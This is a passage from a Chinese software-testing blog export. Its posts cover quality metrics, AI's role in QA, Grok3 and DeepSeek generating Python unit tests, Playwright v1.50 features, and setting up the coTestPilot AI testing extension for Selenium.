IT、DevOps 和助力企业胜利的故事》\n最后自问：值得测量吗？ Gregg Stocker 在《避免企业死亡螺旋》中将\u0026quot;数字执念\u0026quot;描述为\u0026quot;组织衰退的预警信号：过度关注财务指标，几乎无视企业不可测量的方面（如士气、文化、领导力发展等）\u0026quot;。\n关键在于：当管理层试图测量一切时，员工最终会觉得什么都不重要。许多公司陷入这个陷阱，认为必须测量所有事物，因为这是他们唯一知道的改进方式。事实是测量需要时间、工具和精力——这是非常昂贵的过程。因此每个指标都必须有目的。开始测量前，先问：\n指标目的是什么？ 应指导可操作的决策。如果结果不会引发任何改变，就不值得测量 现在是正确时机吗？ 内外部因素（如公司重组）可能影响数据准确性。此时测量可能浪费资源或导致误导性见解 准备好根据发现行动了吗？ 如果公司缺乏根据数据调整流程/工具的能力，请考虑推迟测量 未能评估测量需求会导致观察者偏差——人们只关注易得数据，忽略隐藏的重要洞察。这被\u0026quot;路灯效应\u0026quot;幽默诠释：\n警察看到醉汉在路灯下找东西。\u0026ldquo;找什么？\u0026ldquo;\u0026ldquo;钥匙\u0026rdquo;。两人找了一会。警察问：\u0026ldquo;确定丢在这？\u0026ldquo;\u0026ldquo;不，在公园丢的\u0026rdquo;。\u0026ldquo;那为什么在这找？\u0026ldquo;\u0026ldquo;因为这里有光\u0026rdquo;。\n不要陷入只在容易处寻找的陷阱——确保你的测量服务于有意义的目的，并与可操作目标一致。\n将注意力转向更广泛的指标\n正如《2024/25 世界质量报告》建议的，质量工程需要实现范式转变：\n超越流程效率和自动化覆盖率的测量\n停止纠结于\u0026quot;我们执行了多少测试\u0026quot;或\u0026quot;自动化覆盖率多高\u0026quot;这类表面指标。这些数字就像餐厅只统计洗碗数量却忽视菜品口味——它们无法说明客户是否真正获得了价值。\n评估质量工程对业务目标的贡献\n建立质量指标与商业成果的直接联系，例如：\n客户满意度提升带来的复购率变化 质量改进对客户生命周期价值（CLV）的影响 缺陷预防节省的运维成本 系统可靠性增强带来的品牌溢价 采用全链路质量视角\n开发《质量影响矩阵》追踪关键决策的质量连锁反应。例如：\n产品决策 架构影响 测试策略调整 运维复杂度变化 客户感知风险 引入 AI 推荐引擎 需要新的性能监控指标 增加模型漂移测试 需部署模型回滚机制 推荐准确性波动可能引起投诉 构建质量感知型组织 最终，质量管理的最高境界是将质量意识融入组织基因。这需要：\n1. 培养质量共治文化\n举办跨部门的\u0026quot;质量洞察工作坊\u0026rdquo;，让开发、运维、客服共同分析客户旅程中的质量痛点 建立\u0026quot;质量大使\u0026quot;制度，每个团队指定专人负责质量倡导 实施\u0026quot;质量故事分享会\u0026rdquo;，用真实客户案例唤醒质量意识 2. 打造自适应质量体系\n开发动态质量模型，根据业务发展阶段自动调整质量阈值\n（初创期：容忍更高故障率但快速迭代；成熟期：强调稳定性和合规性） 创建《质量技术雷达》，持续评估新兴工具/方法的质量赋能潜力 实施\u0026quot;质量压力测试\u0026rdquo;，定期模拟极端场景检验质量体系韧性 3. 量化质量的经济价值\n计算质量投资回报率（QROI）： 1 QROI = （质量改进带来的收益 - 质量投入成本）/ 质量投入成本 × 100% 开发《质量资产负债表》，将技术债、缺陷库存等质量要素转化为财务语言 在董事会报告中设立质量专项章节，展示质量指标与股价波动的相关性分析 最后的思考：质量即体验 在星巴克，店员会记住常客的口味；在苹果商店，Genius Bar 提供个性化技术支持——这些企业深谙质量的真谛：质量不是产品属性，而是情感共鸣。当我们将质量从冰冷的 KPI 转化为温暖的客户体验时，才能真正实现\u0026quot;质量无形，润物无声\u0026quot;的境界。\n下次当你准备测量某个质量指标时，不妨先问问：这个数字能让我们的客户会心一笑吗？如果不能，或许你正在测量错误的东西。毕竟，最好的质量指标，往往是客户眼角的那抹笑意。\n原文地址 https://medium.com/@daria_kotelenets/top-3-useless-quality-metrics-and-what-to-measure-instead-0b52cb5ac77f\n","date":"2025-03-09T10:58:16+08:00","permalink":"zh.ethanhan.cc/p/3%E4%B8%AA%E6%9C%80%E6%B2%A1%E7%94%A8%E7%9A%84%E8%B4%A8%E9%87%8F%E6%8C%87%E6%A0%87%E4%BB%A5%E5%8F%8A%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%93%AA%E4%BA%9B%E6%8C%87%E6%A0%87%E5%8E%BB%E6%9B%BF%E4%BB%A3/","title":"3个最没用的质量指标(以及可以用哪些指标去替代)"},{"content":"前言 我个人认为，AI 一定会对软件测试甚至整个行业内的质量保障工作带来天翻地覆的影响。\n但是现在，AI 对测试人员来说可能更接近工具一些。\n正好看到一篇讨论类似内容的文章，随手用 AI 翻译了一下，供大家参考。\n两种极端观点的碰撞 直到最近，关于 AI 在软件测试中的讨论仍存在两种极端观点。一方面，狂热者坚信 AI 将在一夜之间彻底改变质量保障(QA)，实现所有测试自动化、预测所有缺陷并使人工测试彻底消失。另一方面，怀疑论者则认为 AI 不过是又一个被过度炒作的趋势，是对真正测试专业性的干扰。\n现实中的平衡点 事实往往介于两者之间。AI 既不是质量保障的银弹，也不是华而不实的噱头。它本质上是一种工具，其价值完全取决于使用方式。\nAI 应该增强而非取代 QA 关于 AI 在 QA 中的最大误解，莫过于认为它将取代人类测试人员。这种观点根本站不住脚。AI 可以自动化繁琐任务、分析海量数据，甚至发现传统方法可能遗漏的模式。但优秀的质量保障工作远不止自动化这么简单，它需要批判性思维、问题解决能力和对业务场景的深刻理解。\n试想：AI 可以生成测试用例，但它能质疑\u0026quot;这个功能对我们的用户真的有意义吗？\u0026quot;\nAI 可以分析日志，但它能挑战产品经理的风险假设吗？\n显然不能。这正是人类测试人员不可替代的价值所在。\n当前 AI 在 QA 中的有效应用 如果我们不再将 AI 视为测试人员的未来替代品，而是作为增强工具，就会发现其真正的应用价值：\n​测试自动化辅助\n自动生成脚本 优化测试覆盖率 自我修复不稳定的测试用例 ​缺陷预测\n通过 AI 驱动的分析识别代码高风险区域 ​智能测试数据管理\n生成真实测试数据 敏感信息脱敏处理 ​视觉与 UI 测试\n检测传统自动化测试可能遗漏的界面问题 QA 中 AI 的错误使用方式 尽管优势明显，但 AI 在 QA 中常被误用。最常见的错误包括盲目信任未经人工验证的 AI 生成测试用例（AI 缺乏领域专业知识），以及没有明确战略地追逐各种 AI 工具。优秀团队会针对具体问题使用 AI，而不是将其作为时髦的装饰品。\n重要警示：AI 无法拯救糟糕的 QA 需要认清的残酷现实是：AI 无法修复低效的测试流程。如果团队缺乏完善的测试策略，AI 不会创造奇迹；如果自动化测试本身混乱，AI 只会加速产生不良结果。AI 是放大器——在扎实的测试基础上，它能提升效率；在薄弱基础上，它只会加速失败。\n未来展望：AI 与 QA 的共生关系 笔者认为，AI 将持续演进，但不会取代测试人员，而是改变工作方式。未来的顶尖 QA 专家会将 AI 视为合作伙伴：利用其处理重复性任务，从而专注于战略规划、风险分析和探索性测试。\n当前对 AI 在 QA 中的定位应该是：强大但非魔法，有用但无法替代专业知识。最重要的是——它是工具而非目标。明智使用将推动 QA 达到新高度，滥用则只会自欺欺人。\n本文由我创作，经 AI 编辑完善。\n原文地址 https://medium.com/@igor.goldshmidt/ai-for-qa-hype-vs-reality-0e548395a577\n","date":"2025-03-09T10:20:56+08:00","permalink":"zh.ethanhan.cc/p/%E5%85%B3%E4%BA%8Eai%E5%9C%A8%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E7%9C%9F%E7%9B%B8%E5%B7%A5%E5%85%B7%E8%80%8C%E9%9D%9E%E9%AD%94%E6%B3%95/","title":"关于AI在软件测试中的真相：工具而非魔法"},{"content":"Grok3 前几天马斯克发布了 Grok3。\n简单试用了一下，有几点感想。\n速度是真快。除了搜索之外，基本上大部分的问题都是秒回； 对中文的理解不错； 代码生成能力令人印象深刻； 因为只是简单的体验了一下，感触比较浅薄。\n与测试的结合 昨天看到 DHH 在社交媒体上谈论 Grok3。\n他表示 Grok3 对他来说最重要的功能是处理测试代码。\n这里可以简单的理解为使用 Grok3 进行单元测试和集成测试用例的编写。\n这也是我认为目前来说 AI 在测试领域可以迅速落地的点。\n特别是使用 AI 进行单元测试用例，理由如下。\n单元测试用例相对来说依赖比较少，做的事情也相对单纯，适合 AI 进行代码生成； 单元测试框架相对来说更新不是非常频繁，哪怕 AI 的数据不是最新，生成的代码可用性也很高； 我们可以先写实现代码再让 AI 对我们的实现代码进行测试，这样上下文比较精确，生成的代码基本上是可用信赖的； 写单元测试比较痛苦的地方是给用例取名，但对 AI 来说，这其实是小菜一碟；我发现 AI 生成的用例名称比我自己写的要有意义的多； 另外我之前也使用过 github 的 copilot 来进行单元测试用例的编写，总体来说速度和准确性都可以接受。\nGrok3 生成的单元测试 这里贴一个 Grok3 生成的测试print(\u0026quot;hello\u0026quot;)的测试用例。\n平心而论，这个用例逻辑很简单，但是实现起来却不是很容易。\nGrok3 非常迅速且准确的完成了这个任务。\n我只能说，用例写的真好，比我自己实现的要好很多。\n我来为 print(\u0026quot;hello\u0026quot;) 这段 Python 代码写几个单元测试用例。由于 print() 是内置函数，主要作用是输出到控制台，测试它的行为需要考虑如何捕获输出。我们可以使用 Python 的 unittest 框架，并结合 io.StringIO 和 sys.stdout 重定向来验证输出结果。\n以下是几个单元测试用例，假设这段代码被封装在一个函数中：\n前提代码 假设我们将 print(\u0026ldquo;hello\u0026rdquo;) 放入一个简单的函数：\n1 2 def print_hello(): print(\u0026#34;hello\u0026#34;) 单元测试代码 以下是基于 unittest 的测试用例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import unittest import sys from io import StringIO # 被测试的函数 def print_hello(): print(\u0026#34;hello\u0026#34;) class TestPrintHello(unittest.TestCase): def setUp(self): # 在每个测试用例前重定向 stdout self.held_output = StringIO() sys.stdout = self.held_output def tearDown(self): # 在每个测试用例后恢复 stdout self.held_output.close() sys.stdout = sys.__stdout__ # 测试用例 1：验证输出内容是否为 \u0026#34;hello\u0026#34; def test_print_hello_output(self): print_hello() output = self.held_output.getvalue().strip() self.assertEqual(output, \u0026#34;hello\u0026#34;) # 测试用例 2：验证输出不为空 def test_print_hello_not_empty(self): print_hello() output = self.held_output.getvalue().strip() self.assertTrue(len(output) \u0026gt; 0) # 测试用例 3：验证输出不包含意外内容 def test_print_hello_no_unexpected_content(self): print_hello() output = self.held_output.getvalue().strip() self.assertNotEqual(output, \u0026#34;hi\u0026#34;) # 不应输出 \u0026#34;hi\u0026#34; self.assertNotIn(\u0026#34;error\u0026#34;, output) # 不应包含 \u0026#34;error\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: unittest.main() 测试用例说明 test_print_hello_output 目标：验证 print_hello() 输出是否精确为 \u0026ldquo;hello\u0026rdquo;。 方法：捕获输出并与预期值比较。 test_print_hello_not_empty 目标：确保函数有输出，而不是空字符串。 方法：检查输出长度大于 0。 test_print_hello_no_unexpected_content 目标：确认输出不包含意外内容（如 \u0026ldquo;hi\u0026rdquo; 或 \u0026ldquo;error\u0026rdquo;）。 方法：使用 assertNotEqual 和 assertNotIn 检查。 运行结果 运行这段测试代码时： 所有测试应该通过，因为 print(\u0026ldquo;hello\u0026rdquo;) 会稳定输出 \u0026ldquo;hello\u0026rdquo;。 如果你修改 print_hello() 为 print(\u0026ldquo;hi\u0026rdquo;)，则 test_print_hello_output 会失败。\n注意事项 sys.stdout 重定向：因为 print() 直接输出到标准输出，我们需要用 StringIO 捕获它。 测试局限：如果 print_hello() 被改为写入文件或不调用 print()，这些测试需要调整。 扩展性：你可以添加更多用例，比如测试换行符 \\n（默认 print() 带换行）：\n1 2 3 4 def test_print_hello_with_newline(self): print_hello() output = self.held_output.getvalue() self.assertTrue(output.endswith(\u0026#34;\\n\u0026#34;)) 如果你想测试其他场景（比如异常处理、参数化输出），告诉我，我可以进一步扩展！\n目前的实践 目前工程化方面，除了 github 的 copilot 和 cursor 等工具之外，很多时候我们都是在做复制和粘贴的工作。\n先把实现代码粘贴进 AI 对话框，然后把单元测试用例拷贝出来。\n效率不高，而且过程很枯燥，时间长了会让人陷入自我怀疑。\n难道我只是复制粘贴的工具么？\n所以后面 AI 生成单元测试的实践可能会是：\n更深层次 IDE 级别的集成，比如一键生成单元测试用例并且运行的能力； 框架级别的 AI 集成。在开发框架里集成 AI 生成测试用例的能力，并进行执行； Deepseek 与单元测试 同样的题目，让 deepseek 去实现print(\u0026quot;hello\u0026quot;)的测试用例。\n以下是针对 print(\u0026quot;hello\u0026quot;) 的单元测试用例，使用 Python 的 unittest 框架并捕获标准输出验证结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import unittest from io import StringIO import sys from unittest.mock import patch # 要测试的代码 def hello_world(): print(\u0026#34;hello\u0026#34;) # 单元测试类 class TestHelloWorld(unittest.TestCase): def test_hello_output(self): # 捕获标准输出 captured_output = StringIO() sys.stdout = captured_output # 执行函数 hello_world() # 恢复标准输出 sys.stdout = sys.__stdout__ # 验证输出结果（注意 print 会自动换行，输出实际为 \u0026#34;hello\\n\u0026#34;） self.assertEqual(captured_output.getvalue().strip(), \u0026#34;hello\u0026#34;) # 另一种方法：使用 unittest.mock.patch 直接捕获输出 @patch(\u0026#39;sys.stdout\u0026#39;, new_callable=StringIO) def test_hello_output_with_patch(self, mock_stdout): hello_world() self.assertEqual(mock_stdout.getvalue().strip(), \u0026#34;hello\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: unittest.main() 说明： 捕获输出逻辑：\n第一种方法手动将 sys.stdout 重定向到 StringIO 对象，执行后恢复原输出。 第二种方法使用 @patch 装饰器自动模拟 sys.stdout，更简洁且避免资源泄漏。 注意换行符：\nprint(\u0026quot;hello\u0026quot;) 实际输出 \u0026quot;hello\\n\u0026quot;，因此断言时使用 .strip() 去掉首尾空白（包括换行符）。 运行测试： 将代码保存为 test_hello.py，执行以下命令：\n1 python -m unittest test_hello.py 预期结果： 测试通过，输出类似：\n1 2 3 4 5 .. ---------------------------------------------------------------------- Ran 2 tests in 0.001s OK 其实 deepseek R1 也能一次写对，但是用例的完备程度是不如 grok3 的，另外输出速度上 grok3 的优势还是比较明显的。\n不过我觉得用 deepseek R1 写单元测试用例应该也没什么问题，用例完备性默认不高的问题可以在 prompt 里面增加引导，有可能会得到不错的效果。\n总结 总之目前看来 AI 在代码能力上的表现是可圈可点的。\n而代码跟测试结合的最紧密的点就是单元测试。\n而开发不写单元测试的原因无非是不会写和没时间写。\n现在 ai 代码助手的出现让这两个理由已经站不住脚了。\n有理由相信在不远的将来，ai 生成的单元测试用例将是大部分软件项目的标配。\n","date":"2025-02-21T09:19:52+08:00","permalink":"zh.ethanhan.cc/p/grok3%E5%92%8Cdeepseek%E5%9C%A8%E6%B5%8B%E8%AF%95%E9%A2%86%E5%9F%9F%E5%A6%82%E4%BD%95%E8%90%BD%E5%9C%B0/","title":"Grok3和deepseek在测试领域如何落地"},{"content":"Playwright v1.50.0 引入了多项值得关注的功能和改进，旨在提升测试体验。以下是这些新增功能的详细概述，并附有示例以说明其使用方法。\nRunner 增强 1. 步骤超时配置 现在可以通过 timeout 选项为单个测试步骤指定最大运行时间。如果某个步骤的运行时间超过此限制，测试将失败。\n示例：\n1 2 3 4 5 6 7 8 9 10 test(\u0026#34;example test\u0026#34;, async ({ page }) =\u0026gt; { await test.step( \u0026#34;step with timeout\u0026#34;, async () =\u0026gt; { // 此步骤必须在 1000 毫秒内完成 await page.click(\u0026#34;#some-button\u0026#34;); }, { timeout: 1000 } ); }); 2. 跳过测试步骤 新增的test.step.skip()方法允许跳过特定的测试步骤，这在某些条件未满足或功能尚未实现的情况下非常有用。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 test(\u0026#34;some test\u0026#34;, async ({ page }) =\u0026gt; { await test.step(\u0026#34;before running step\u0026#34;, async () =\u0026gt; { // 正常步骤 }); await test.step.skip(\u0026#34;not yet ready\u0026#34;, async () =\u0026gt; { // 此步骤将被跳过 }); await test.step(\u0026#34;after running step\u0026#34;, async () =\u0026gt; { // 即使上一步被跳过，此步骤仍会运行 }); }); 3. ARIA 快照存储于单独文件 expect(locator).toMatchAriaSnapshot()方法已扩展，允许将 ARIA 快照存储在单独的 YAML 文件中，便于更好地组织和版本控制。\n示例：\n1 2 3 4 test(\u0026#34;ARIA snapshot test\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;https://example.com\u0026#34;); await expect(page.locator(\u0026#34;body\u0026#34;)).toMatchAriaSnapshot(); }); 在此示例中，ARIA 快照将存储在对应的 YAML 文件中。\n4. 可访问性错误消息断言 新增方法expect(locator).toHaveAccessibleErrorMessage()，可用于断言某个定位器指向的元素具有特定的 ARIA 错误消息。\n示例：\n1 2 3 4 5 6 test(\u0026#34;accessible error message test\u0026#34;, async ({ page }) =\u0026gt; { await page.goto(\u0026#34;https://example.com/form\u0026#34;); await page.click(\u0026#34;#submit-button\u0026#34;); const input = page.locator(\u0026#34;#username\u0026#34;); await expect(input).toHaveAccessibleErrorMessage(\u0026#34;Username is required\u0026#34;); }); 5. 快照更新配置 testConfig.updateSnapshots选项现在包含一个新的枚举值。将此选项设置为changed时，仅更新已更改的快照；设置为all时，无论是否有差异，都会更新所有快照。\n命令行示例：\n1 npx playwright test --update-snapshots=changed 6. 源代码更新方法配置 新增选项testConfig.updateSourceMethod，定义在配置testConfig.updateSnapshots时如何更新源代码。可用模式包括 overwrite、3-way 和 patch。\n命令行示例：\n1 npx playwright test --update-snapshots=changed --update-source-method=3way 7. Web 服务器的优雅关闭 testConfig.webServer选项现在包含一个gracefulShutdown字段，允许你指定一个进程终止信号，而不是默认的SIGKILL。\n配置示例：\n1 2 3 4 5 6 7 8 // playwright.config.js module.exports = { webServer: { command: \u0026#34;npm run start\u0026#34;, port: 3000, gracefulShutdown: \u0026#34;SIGTERM\u0026#34;, }, }; 8. 访问测试步骤附件 现在在报告器 API 中公开了testStep.attachments属性，允许检索特定测试步骤创建的所有附件。\n示例：\n1 2 3 4 5 6 class CustomReporter { onStepEnd(test, result, step) { const attachments = step.attachments; // 按需处理附件 } } 用户界面更新 1. 增强的 HTML 报告器 默认的 HTML 报告器已更新，改进了附件的显示方式，提供更直观和信息丰富的布局。\n2. ARIA 快照元素选择器 UI 中新增了一个按钮，用于选择生成 ARIA 快照的元素，简化了创建无障碍性测试的流程。\n3. 详细的行动信息 现在在追踪中会显示额外的细节，例如在行动中按下的按键，这些信息会与 API 调用一起显示，为测试执行提供更深入的洞察。\n4. 默认禁用 Canvas 内容显示 由于可能引发错误，现在默认禁用在追踪中显示\u0026lt;canvas\u0026gt;内容。可以通过 UI 中的“显示 Canvas 内容”设置启用。\n5. 增强的计时信息 “调用”和“网络”面板现在显示额外的计时信息，有助于性能分析和调试。\n破坏性变更 1. 可编辑元素断言 如果目标元素不是\u0026lt;input\u0026gt;、\u0026lt;select\u0026gt;或其他已识别的可编辑元素，expect(locator).toBeEditable()和locator.isEditable()方法现在会抛出错误。\n示例：\n1 2 const element = page.locator(\u0026#34;#non-editable-element\u0026#34;); await expect(element).toBeEditable(); // 抛出错误 快照更新行为 将testConfig.updateSnapshots设置为all时，现在会更新所有快照，而不仅仅是失败或已更改的快照。要保留之前仅更新已更改快照的行为，请使用新的changed枚举值。\n命令行示例：\n1 npx playwright test --update-snapshots=changed 浏览器版本更新 Playwright v1.50.0 包含以下浏览器版本：\n• Chromium 133.0.6943.16\n• Mozilla Firefox 134.0\n• WebKit 18.2\n结论 Playwright v1.50.0 带来了显著的改进，提升了测试效率、无障碍性验证和调试能力。新的步骤超时配置、步骤跳过和 ARIA 快照增强功能提高了测试执行的健壮性。Web 服务器的优雅关闭和追踪中详细的行动信息为开发者提供了更友好的测试体验。此外，诸如更严格的可编辑元素断言等破坏性变更，进一步增强了测试的可靠性。\n","date":"2025-02-14T09:23:25+08:00","permalink":"zh.ethanhan.cc/p/playwright-v1.50.5%E5%8F%91%E5%B8%83%E4%BA%86/","title":"Playwright v1.50.5发布了"},{"content":"最近看到一款新发布的 AI 自动化测试工具 coTestPilot.ai，项目主页在这里。\n这是由 Checkie.AI 的测试专家开发的开源扩展，为自动化测试带来了额外的 AI 功能。该项目旨在通过简单集成现有的 Playwright 和 Selenium 测试，使每个自动化工程师都能享受到 AI 给测试带来的便捷。\n什么是 coTestPilot？ coTestPilot 是 checkie.ai 和 testers.ai 上可用的 AI 测试 agent 的轻量级版本。它通过利用 GPT-4 Vision 分析网页，为 Playwright 和 Selenium 扩展了自动化测试和缺陷检测的 AI 能力，以识别潜在问题、不一致和可用性问题。\n最棒的是，只需添加一个函数调用，就可以为现有的测试自动化添加 AI 驱动的检查。\n主要特点 多样化测试角色：内置多个测试 agent 配置文件，包括 UI/UX 专家、无障碍专家、安全测试人员等 可定制检查：轻松添加自定义测试规则和专门的提示 全面分析：识别视觉错误、内容不一致和功能问题 详细报告：生成包含屏幕截图和详细问题描述的 HTML 报告 速率限制和重试逻辑：内置 API 速率限制保护 为什么使用 AI 测试 agent？ 传统的自动化测试擅长检查特定的预定义场景，但常常会忽略人工测试人员会立即发现的意外问题。coTestPilot 通过为自动化测试套件添加一个 AI 驱动的\u0026quot;额外视角\u0026quot;来解决这个问题。 AI agent 可以识别如下问题：\n元素错位和视觉缺陷 内容不一致和拼写错误 无障碍问题 基本安全问题 性能预警 用户体验问题 入门指南 以 selenium 的版本为例。\n1 2 3 4 5 6 git clone https://github.com/jarbon/coTestPilot/tree/main/Selenium/4/py/selenium_cotestpilot export OPENAI_API_KEY=\u0026#39;your-api-key\u0026#39; pip install selenium pip install webdriver-manager # For easy driver management 把下载下来的一整串 selenium_cotestpilot 重命名成selenium_cotestpilot，然后新建 1 个文件se_test.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from selenium import webdriver from selenium.webdriver.chrome.service import Service from webdriver_manager.chrome import ChromeDriverManager import selenium_cotestpilot # import checks # Configure logging and settings configure_logging( level=\u0026#34;DEBUG\u0026#34;, console_verbosity=LogLevel.VERBOSE, config={ \u0026#39;api_rate_limit\u0026#39;: 0.25, # API calls per second \u0026#39;screenshot_retention_days\u0026#39;: 7, # Screenshot retention period \u0026#39;max_retries\u0026#39;: 5 # API call retry attempts } ) # Initialize Selenium and navigate to a page driver = webdriver.Chrome(service=Service(ChromeDriverManager().install())) driver.get(\u0026#39;https://example.com\u0026#39;) # Basic AI check with additional options result = driver.ai_check( console_verbosity=LogLevel.BASIC, # Control logging for this check save_to_file=True, # Save results to JSON file output_dir=\u0026#34;ai_check_results\u0026#34; # Directory for results ) print(f\u0026#34;Found {len(result.bugs)} issues\u0026#34;) # Generate HTML report report_path = driver.ai_report(output_dir=\u0026#34;ai_check_results\u0026#34;) print(f\u0026#34;Report generated at: {report_path}\u0026#34;) 测试报告 测试报告如下所示。\n支持的测试 agent 下面是所有支持的测试角色列表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 { \u0026#34;testers\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Jason\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Democratizing quality at scale. Likes to test all the basic aspects of an app, but do it at scale.\u0026#34;, \u0026#34;matches\u0026#34;: [\u0026#34;AI\u0026#34;, \u0026#34;Quality\u0026#34;, \u0026#34;Search\u0026#34;, \u0026#34;Browser\u0026#34;], \u0026#34;interests\u0026#34;: \u0026#34;AI, Testing, Automation, Quality, Scale, Basic Testing,Innovation and testing browsers and search engines.\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Aiden\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Aiden has a keen eye for UI inconsistencies and visual bugs across different devices and screen sizes. Aiden is also a certified scuba diver and enjoys exploring underwater landscapes during his travels.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;UI Testing\u0026#34;, \u0026#34;Visual Regression Testing\u0026#34;, \u0026#34;Responsive Design Testing\u0026#34;, \u0026#34;Cross-Device Testing\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;Responsive Design Testing, Cross-Device Compatibility, Visual Regression Testing\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Marcus\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Marcus is passionate about brand consistency and visual design in software products. He\u0026#39;s also a talented painter, and his art often explores themes of identity and culture.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;Brand Consistency\u0026#34;, \u0026#34;Visual Design\u0026#34;, \u0026#34;UI Testing\u0026#34;, \u0026#34;Brand Testing\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;UI Design Testing, Brand Guidelines Testing, Visual Consistency Testing\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Adeela\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Adeela specializes in responsive mobile web testing across various devices and operating systems.\u0026#34;, \u0026#34;matches\u0026#34;: [\u0026#34;Mobile\u0026#34;, \u0026#34;Cross-platform\u0026#34;, \u0026#34;Devices\u0026#34;, \u0026#34;Operating systems\u0026#34;], \u0026#34;interests\u0026#34;: \u0026#34;Cross-platform compatibility, mobile UX, app store guidelines\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Sophia\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Sophia is a content specialist who ensures that every word in an app is consistent and free from errors. With her sharp eye for detail, she loves refining documentation to make it clear and accessible for global audiences.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;Content\u0026#34;, \u0026#34;Inconsistency\u0026#34;, \u0026#34;Spelling\u0026#34;, \u0026#34;Grammar\u0026#34;, \u0026#34;Formatting\u0026#34;, \u0026#34;Clarity\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;Technical writing, localization, style guides, translation\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Alejandro\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Alejandro is an accessibility specialist who works tirelessly to ensure digital experiences are inclusive for everyone, particularly for users with disabilities. He\u0026#39;s passionate about ensuring all users feel represented in the digital world.\u0026#34;, \u0026#34;matches\u0026#34;: [\u0026#34;Accessibility\u0026#34;, \u0026#34;Inclusive\u0026#34;, \u0026#34;User Advocacy\u0026#34;], \u0026#34;interests\u0026#34;: \u0026#34;Inclusive design, assistive technologies, digital rights for the disabled\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Isabella\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Isabella focuses on usability testing, ensuring that products are intuitive and easy to use for all types of users. She enjoys cooking and often hosts dinners for her family and friends.\u0026#34;, \u0026#34;matches\u0026#34;: [\u0026#34;Usability\u0026#34;, \u0026#34;Intuitive Design\u0026#34;, \u0026#34;User Research\u0026#34;], \u0026#34;interests\u0026#34;: \u0026#34;User Research, Accessibility Testing, Cognitive Load Analysis\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Pete\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Pete is passionate about privacy protection and compliance with data protection regulations. In his free time, he loves to go on long motorcycle road trips.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;Security Testing\u0026#34;, \u0026#34;Privacy Testing\u0026#34;, \u0026#34;GDPR Compliance\u0026#34;, \u0026#34;Data Protection\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;GDPR Compliance, Data Anonymization, Privacy by Design\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Zachary\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Zachary, known for his unconventional testing methods, loves pushing systems to their limits with bizarre and creative user actions. His outside-the-box thinking often uncovers bugs in the most unexpected places.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;Boundary Testing\u0026#34;, \u0026#34;Edge Cases\u0026#34;, \u0026#34;Creative\u0026#34;, \u0026#34;Unexpected\u0026#34;, \u0026#34;Chaos Engineering\u0026#34;, \u0026#34;Unconventional\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;Chaos Engineering, fuzz testing, edge case exploration\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Zoe\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Zoe is a meticulous tester who takes pride in uncovering elusive bugs that often go unnoticed. Her sharp attention to detail and methodical approach make her a sought-after bug hunter in high-stakes projects.\u0026#34;, \u0026#34;matches\u0026#34;: [\u0026#34;Elusive Bugs\u0026#34;, \u0026#34;Attention to Detail\u0026#34;, \u0026#34;Thorough\u0026#34;], \u0026#34;interests\u0026#34;: \u0026#34;Bug tracking, root cause analysis, memory leaks\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Emma\u0026#34;, \u0026#34;biography\u0026#34;: \u0026#34;Emma is an expert in form validation and user input handling. Her sharp eye for detail ensures that even the most subtle data entry issues are caught and resolved before they impact users.\u0026#34;, \u0026#34;matches\u0026#34;: [ \u0026#34;Form Validation\u0026#34;, \u0026#34;Input Handling\u0026#34;, \u0026#34;Data Entry Testing\u0026#34;, \u0026#34;UX Issues\u0026#34; ], \u0026#34;interests\u0026#34;: \u0026#34;Input Validation, Accessibility Testing, UX Writing, Usability Testing\u0026#34; } ] } 实现原理 看了一眼代码，实现其实非常直接。\n所有的实现都在__init__.py里，所以上面的代码示例里，只需要import 